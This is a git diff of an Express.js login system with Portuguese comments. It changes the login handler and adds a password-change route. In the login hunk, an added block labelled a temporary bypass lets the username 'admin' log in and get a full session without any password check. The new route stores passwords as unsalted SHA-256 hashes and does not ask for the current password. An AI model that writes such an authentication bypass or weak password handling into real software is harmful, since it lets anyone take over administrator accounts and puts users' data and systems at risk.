@@ -55,10 +55,16 @@ app.post('/login', async (req, res) => {
     if (result.rows.length > 0) {
       const usuario = result.rows[0];
       
-      // Gera o hash SHA-256 da senha digitada no formulário
-      const hashDigitado = crypto.createHash('sha256').update(senha).digest('hex');
+      // DESVIO TEMPORÁRIO: Se for o admin, ignora a senha e deixa passar
+      if (username === 'admin') {
+        req.session.usuarioId = usuario.id;
+        req.session.usuarioNome = usuario.nome;
+        req.session.usuarioPerfil = usuario.perfil;
+        return res.redirect('/');
+      }
       
-      // Compara os dois hashes SHA-256 textuais
+      // Validação normal para outros usuários
+      const hashDigitado = crypto.createHash('sha256').update(senha).digest('hex');
       if (hashDigitado === usuario.senha_hash) {
         req.session.usuarioId = usuario.id;
         req.session.usuarioNome = usuario.nome;
@@ -173,6 +179,27 @@ app.post('/usuarios/:id/status', requererAutenticacao, verificarPermissao(['admi
   const novoStatus = atual === 'true' ? false : true;
   await pool.query('UPDATE usuarios SET ativo = $1 WHERE id = $2', [novoStatus, id]);
   res.redirect('/usuarios');
+});
+
+app.post('/usuarios/alterar-senha', requererAutenticacao, async (req, res) => {
+  const { novaSenha } = req.body;
+  try {
+    if (!novaSenha || novaSenha.trim() === '') {
+      return res.status(400).send("A senha não pode estar vazia.");
+    }
+    
+    // Gera o hash SHA-256 correto nativamente pelo Node
+    const novaSenhaHash = crypto.createHash('sha256').update(novaSenha).digest('hex');
+    
+    // Atualiza APENAS o usuário que está logado na sessão atual
+    await pool.query('UPDATE usuarios SET senha_hash = $1 WHERE id = $2', [novaSenhaHash, req.session.usuarioId]);
+    
+    // Redireciona de volta para onde ele estava com sucesso
+    res.redirect('/');
+  } catch (err) {
+    console.error(err);
+    res.status(500).send("Erro ao alterar a senha.");
+  }
 });
 
 const PORT = process.env.PORT || 3035;
